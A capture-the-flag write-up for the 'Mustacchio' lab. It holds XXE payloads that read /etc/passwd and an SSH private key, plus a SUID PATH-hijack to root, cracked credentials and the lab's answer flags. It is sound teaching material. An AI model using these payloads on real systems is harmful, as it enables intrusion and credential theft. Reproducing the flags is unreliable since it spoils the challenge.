# 🥸 Mustacchio

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `mustacchio.thm` |
| **OS** | Ubuntu 16.04 |
| **Attack Surface** | SQLite credential leak, XXE file read, encrypted SSH key |
| **Privesc** | SUID binary PATH hijack → root |

Mustacchio leaks admin credentials from an exposed SQLite backup file, which grants access to an admin panel on a non-standard port. That panel processes XML input without sanitisation, enabling XXE to read `barry`'s encrypted SSH private key off the filesystem. The key is cracked with John, landing a shell as `barry`. From there, a SUID binary owned by root calls `tail` without an absolute path — prepending `/tmp` to `$PATH` and dropping a malicious `tail` there escalates straight to root.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 mustacchio.thm -oA mustacchio-tcp-scan
```

```
22/tcp   open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open  http   Apache httpd 2.4.18
                      robots.txt: 1 disallowed entry (/)
8765/tcp open  http   nginx 1.10.3
                      Title: Mustacchio | Login
```

Two HTTP services — port 80 is the public-facing site, port 8765 is a login panel. `robots.txt` disallowing `/` on port 80 is worth noting but doesn't give much directly. The interesting target is the admin login on 8765.

### Directory Bruteforce — Port 80

```bash
ffuf -u http://mustacchio.thm/FUZZ -w ./raft-medium-directories.txt -ic
```

Notable hit: `/custom/js/` — contains `users.bak`, a SQLite database backup left exposed in a static assets directory.

```bash
wget http://mustacchio.thm/custom/js/users.bak
```

### SQLite Credential Extraction

```bash
sqlite3 users.bak
```

```sql
.tables
-- users

SELECT * FROM users;
-- admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

SHA1 hash. Cracked offline (or via any online hash lookup):

```
1868e36a6d2b17d4c2745f1659433a54d4bc5f4b → bulldog19
```

Credentials: `admin` / `bulldog19`

---

## 💀 Initial Access — XXE File Read → SSH Key Exfiltration

### Admin Panel Login

Logging into `http://mustacchio.thm:8765` with the credentials above drops into an admin panel that accepts XML input to add comments.

### XXE Payload

The XML is parsed server-side without entity restrictions. A classic `SYSTEM` entity pointing at a local file confirms blind XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <author>&xxe;</author>
    <name>test</name>
</root>
```

Response confirms file read. The page source for the admin panel leaks a comment hinting at `barry`'s SSH key path — targeting `/home/barry/.ssh/id_rsa`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<root>
    <author>&xxe;</author>
    <name>test</name>
</root>
```

URL-encoded POST request sent via Burp:

```
xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A
%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fhome
%2Fbarry%2F.ssh%2Fid_rsa%22%3E%5D%3E%0D%0A%3Croot%3E%0D%0A++++++++
%3Cauthor%3E%26xxe%3B%3C%2Fauthor%3E%0D%0A++++++++%3Cname%3Etest%3C
%2Fname%3E%0D%0A%3C%2Froot%3E
```

Response returns the private key in the `Author` field:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
...
-----END RSA PRIVATE KEY-----
```

Key is AES-128-CBC encrypted — needs a passphrase.

### Cracking the SSH Key

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=./rockyou.txt
```

```
urieljames       (id_rsa)
1g 0:00:00:05 DONE
```

### SSH Access

```bash
chmod 600 id_rsa
ssh barry@mustacchio.thm -i id_rsa
# passphrase: urieljames
```

```
barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831
```

---

## 🔁 Privilege Escalation — SUID Binary PATH Hijack → root

### SUID Discovery

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
-rwsr-xr-x 1 root root 17K Jun 12 2021 /home/joe/live_log
```

Non-standard SUID binary sitting in another user's home directory. Worth inspecting.

### Binary Analysis

```bash
./live_log
# streams live nginx access log entries
```

```bash
strings live_log | grep -i tail
# tail -f /var/log/nginx/access.log
```

`live_log` calls `tail` by name only — no absolute path. This is a textbook PATH hijack.

### PATH Hijack

Drop a malicious `tail` into `/tmp` that spawns a shell, then prepend `/tmp` to `$PATH`:

```bash
echo '/bin/bash' > /tmp/tail
chmod +x /tmp/tail
export PATH=/tmp:$PATH
```

```bash
./live_log
```

```
root@mustacchio:/home/joe# id
uid=0(root) gid=0(root) groups=0(root)

root@mustacchio:/root# cat root.txt
3223581420d906c4dd1a5f9b530393a5
```

---

## 🗺️ Attack Chain

```
[Port 80 — Apache]
    /custom/js/users.bak exposed → SQLite → admin:bulldog19
          │
          ▼
[Port 8765 — Nginx Admin Panel]
    XML input → XXE SYSTEM entity → /home/barry/.ssh/id_rsa
          │
          ▼
[Encrypted SSH Key]
    ssh2john → john → passphrase: urieljames → shell as barry
          │
          ▼
[SUID Binary — /home/joe/live_log]
    calls tail without absolute path
    → /tmp/tail = /bin/bash → PATH hijack → root
```

---

## 📌 Key Takeaways

- Backup files (`.bak`, `.sql`, `.sqlite`) in web-accessible directories are a direct credential leak — always audit static asset directories
- XML parsers that allow external entities (`SYSTEM`) with no restriction are full filesystem reads as the web server user; disabling external entity processing is a one-line fix in every major language
- SSH private keys in home directories are reachable via XXE if the web server runs as a sufficiently privileged user — principle of least privilege matters
- SUID binaries calling system utilities without absolute paths are a reliable privesc; always use full paths (`/usr/bin/tail`) in any setuid context
- Encrypted SSH keys only add friction — if the passphrase is in rockyou.txt it buys seconds, not security

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004) |
| Privilege Escalation | Hijack Execution Flow: Path Interception by PATH Environment Variable | [T1574.007](https://attack.mitre.org/techniques/T1574/007) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Directory bruteforce to find /custom/js/users.bak |
| `wget` | Download SQLite backup file |
| `sqlite3` | Extract admin credentials from database |
| Burp Suite | Send XXE payload to admin panel, exfiltrate SSH key |
| `ssh2john` | Extract hash from encrypted RSA private key |
| `john` | Crack SSH key passphrase |
| `ssh` | Login as barry with cracked key |
| `strings` | Identify PATH hijack vector in SUID binary |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `62d77a4d5f97d47c5aa38b3b2651b831` |
| `root.txt` | `3223581420d906c4dd1a5f9b530393a5` |
